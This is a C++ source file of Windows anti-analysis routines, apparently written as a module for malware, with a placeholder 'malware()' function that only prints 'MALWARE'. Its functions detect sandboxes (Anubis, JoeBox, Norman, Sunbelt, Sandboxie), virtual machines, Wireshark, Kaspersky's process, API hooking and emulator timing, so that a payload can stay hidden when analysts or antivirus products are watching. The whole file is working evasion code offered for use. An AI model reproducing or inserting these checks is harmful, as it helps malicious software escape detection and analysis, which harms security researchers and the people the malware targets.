#include <string>
#include <tlhelp32.h>
#include <TCHAR.H>   
#include <dir.h>

using namespace std;

int detected = 0;

DWORD GetModulePath(HINSTANCE hInst,LPTSTR pszBuffer,DWORD dwSize)
{
	DWORD dwLength = GetModuleFileName(hInst,pszBuffer,dwSize);
	
	if(dwLength)
	{
		while(dwLength && pszBuffer[ dwLength ] != _T('\\'))
		{
			dwLength--;
		}
		if(dwLength)
		{
			pszBuffer[ dwLength + 1 ] = _T('\000');
        }
	}
	return dwLength;
}

BOOL IsProcessRunning(const string szExeName)
{    
    PROCESSENTRY32 pce = {sizeof(PROCESSENTRY32)};
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    
    if(Process32First(hSnapshot, &pce))
    {
        do
        {         
            if(!strcmp((const char*)pce.szExeFile, (const char*)szExeName.c_str()))
            {       
            return 1;
            }  
        }while( Process32Next(hSnapshot, &pce) );
        
    }
    
    return 0; 
}

BOOL IsUsername(const string comp)
{
    char username[30];
    DWORD nSize;
    
    nSize = sizeof(username);
    GetUserName(username, &nSize);

    if(strcmp(username,comp.c_str()) == 0)
    {
        return 1;
    }
    return 0;
}

BOOL IsFileInFolder(const char* filefold)
{
    char buff[255];
    
    GetModuleFileName(0,buff,255);

    if (strstr(buff, filefold))
    {
       return 1;
    }
    
    return 0;
    
}

BOOL IsFolderExist(const string comp)
{
     
    if(chdir(comp.c_str()) == 0)
    {
       return 1;
    }

    return 0;
}

BOOL IsFileNameEqualThis(const string comp)
{
    char buff[255];  
    
    GetModuleFileName(0,buff,255);
    
    if(strcmp(buff,comp.c_str()) == 0)
    {
        detected++;
        return 1;
    }
    return 0;
}

BOOL IsFileExist(const string comp)
{
    FILE *fp = NULL,*fp2 = NULL;
    fp = fopen(comp.c_str(),"r");
        
    if(fp != NULL)
    {
        return 1;
    }
    
        return 0;
}

BOOL IsAnubis()
{

    if (IsFileInFolder("C:\\InsideTm\\") == 1)
    {
       detected = 1;
       return 1;
    }
    
    else if(IsFileNameEqualThis("C:\\sample.exe"))
    {
       detected = 1;
       return 1;
    }
    
    else if(IsUsername("user") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}

BOOL IsTE()
{
     
    if(IsUsername("UserName") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}

BOOL IsSandbox()
{
     
    if(IsUsername("USER") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}

BOOL IsJB()
{
    
    if(IsProcessRunning("joeboxserver.exe") == 1 || IsProcessRunning("joeboxcontrol.exe") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;           
}    

BOOL IsNorman()
{
     
    if(IsUsername("currentuser") == 1 || IsUsername("CurrentUser") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}

BOOL IsWireShark()
{
     
    if(IsProcessRunning("wireshark.exe") == 1)
    {
       detected = 1;
       return 1;
    }
    
    return 0;
}

BOOL IsKaspersky()
{
     
    if(IsProcessRunning("avp.exe") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}


BOOL IsID()
{
         
    if(GetModuleHandle("api_log.dll") || GetModuleHandle("dir_watch.dll"))
    {
        detected = 1;
        return 1;
    }
    
    else if(IsProcessRunning("sniff_hit.exe") == 1 || IsProcessRunning("sysAnalyzer.exe") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}  

BOOL IsSunbelt()
{
     
    if(GetModuleHandle("pstorec.dll"))
    {
        detected = 1;
        return 1;
    }
    
    else if(IsFolderExist("C:\\analysis") == 1)
    {
        detected = 1;
        return 1;
    }
    
    else if(IsFileExist("C:\\analysis\\SandboxStarter.exe") == 1) //sometimes the IsFolderExist fail
    {
        detected = 1;
        return 1;
    }            
              
    return 0;
}

BOOL IsSandboxie()
{
     
    if(GetModuleHandle("SbieDll.dll"))
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}

BOOL IsVPC() //steve10120
{
  HMODULE dll = LoadLibrary("C:\\vmcheck.dll");
  
  if(dll == NULL)
  {
      return 0;
  }

  BOOL (WINAPI *fnIsRunningInsideVirtualMachine)() = (BOOL (WINAPI *)()) GetProcAddress(dll, "IsRunningInsideVirtualMachine");

  BOOL retValue = FALSE;

  if(fnIsRunningInsideVirtualMachine != NULL)
  {                                                                  
      retValue = fnIsRunningInsideVirtualMachine();
      FreeLibrary(dll);
      detected = 1;
      return 1;
  }

  FreeLibrary(dll);
    
  return 0;
}

BOOL IsOther() //carb0n
{
   unsigned char bBuffer;
   unsigned long aCreateProcess = (unsigned long)GetProcAddress( GetModuleHandle( "KERNEL32.dll" ), "CreateProcessA" );

   ReadProcessMemory( GetCurrentProcess( ), (void *) aCreateProcess, &bBuffer, 1, 0 );
   
   if( bBuffer == 0xE9 )
   {
       detected = 1;
       return 1;
   }

   return 0;
}

BOOL IsEmu() //Noble & ChainCoder
{
    DWORD countit, countit2;
    
    countit = GetTickCount(); 
    Sleep(500);
    countit2 = GetTickCount(); 

    if ((countit2 - countit) < 500)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}

BOOL IsVB()
{
    
    if(IsProcessRunning("VBoxService.exe") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}

BOOL IsWPE()
{
     
    if(GetModuleHandle("WpeSpy.dll"))
    {
        detected = 1;
        return 1;
    }
    
    else if(IsProcessRunning("WPE PRO.exe") == 1)
    {
        detected = 1;
        return 1;
    }
    
    return 0;
}


BOOL malware()
{
    //some malware code
    cout << "MALWARE" << endl;
    
    return 0;
}


BOOL IsAll()
{
    if(IsAnubis() == 1)
    {
    }
    else if(IsTE() == 1)
    {
    }
    else if(IsSandbox() == 1)
    {
    }
    else if(IsJB() == 1)
    {
    }
    else if(IsNorman() == 1)
    {
    }
    else if(IsWireShark() == 1)
    {
    }
    else if(IsKaspersky() == 1)
    {
    }
    else if(IsID() == 1)
    {
    }
    else if(IsSunbelt() == 1)
    {
    }
    else if(IsSandboxie() == 1)
    {
    }
    else if(IsVPC() == 1)
    {
    }
    else if(IsVB() == 1)
    {
    }
    else if(IsWPE() == 1)
    {
    }
    else if(IsOther() == 1 || IsEmu() == 1)
    {
    }
    if(detected != 0)
    {        
        return 1;
    }
    return 0;
}
